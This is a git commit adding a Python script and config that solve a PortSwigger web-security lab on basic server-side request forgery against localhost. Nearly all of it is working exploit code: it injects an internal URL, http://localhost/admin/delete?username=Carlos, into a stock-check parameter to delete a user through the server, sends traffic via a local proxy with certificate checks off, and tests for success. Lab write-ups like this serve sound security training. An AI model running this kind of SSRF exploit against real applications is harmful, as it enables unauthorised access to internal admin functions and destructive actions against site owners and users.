0e820eb98b1d11e886b4ac6bc67248258f1bbf13
pbharathbhu <cdubhu@gmail.com>
2023-06-25 22:34:44 +0530

    ssrf lab#01
    solution for lab01 of ssrf on portswigger
    https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost

---
+++ ssrf/basic ssrf attack against local server/config.py
@@ -0,0 +1,7 @@
+proxies = {
+    'http': 'http://127.0.0.1:8080',
+    'https': 'http://127.0.0.1:8080'
+}
+stock_check_url = 'http://localhost/admin'
+delete_user_payload = '/admin/delete?username=Carlos'
+stock_path = '/product/stock'
---
+++ ssrf/basic ssrf attack against local server/lab01.py
@@ -0,0 +1,35 @@
+'''
+This automation helps us in ssrf attack on localhost of the application
+makes use of the cart item info as reference url and hits a delete user 
+url. thus explots the application.
+'''
+import requests
+import sys
+import urllib3
+import config
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+def delete_user(url):
+    param = {'stockApi': config.stock_check_url + config.delete_user_payload}
+    r = requests.post(url + config.stock_path, data=param, verify=False, proxies=config.proxies)
+
+    # Check if the user "Carlos" is deleted on the page to ensure the SSRF attack is successful
+    param2 = {'stockApi': config.stock_check_url}
+    r = requests.post(url + config.stock_path, data=param2, verify=False, proxies=config.proxies)
+    if 'User deleted successfully' in r.text:
+        print("User Carlos deleted successfully")
+    else:
+        print("Exploit was unsuccessful")
+
+def main():
+    if len(sys.argv) != 2:
+        print("(+) Usage: %s <url>" % sys.argv[0])
+        print("(+) Example: %s www.example.com" % sys.argv[0])
+        sys.exit(0)
+    url = sys.argv[1]
+    print("Deleting Carlos user....")
+    delete_user(url)
+
+if __name__ == "__main__":
+    main()
